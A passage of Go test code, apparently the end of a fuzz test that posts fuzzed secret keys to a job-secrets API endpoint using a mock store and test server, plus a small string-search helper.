			CreateJobSecretFunc: func(_ context.Context, secret *domain.JobSecret) error {
				secret.ID = "sec-fuzz"
				secret.CreatedAt = time.Now()
				secret.UpdatedAt = time.Now()
				return nil
			},
		}
		srv := newTestServer(t, ms, &mockQueue{}, nil)

		reqBody := map[string]string{
			"project_id": "proj-1",
			"secret_key": key,
			"value":      "fuzz_value",
		}
		bodyJSON, err := json.Marshal(reqBody)
		if err != nil {
			return
		}

		w := httptest.NewRecorder()
		srv.ServeHTTP(w, authedRequest(http.MethodPost, "/v1/secrets", string(bodyJSON)))
		_ = w.Code
	})
}

func containsString(values []string, needle string) bool {
	return slices.Contains(values, needle)
}
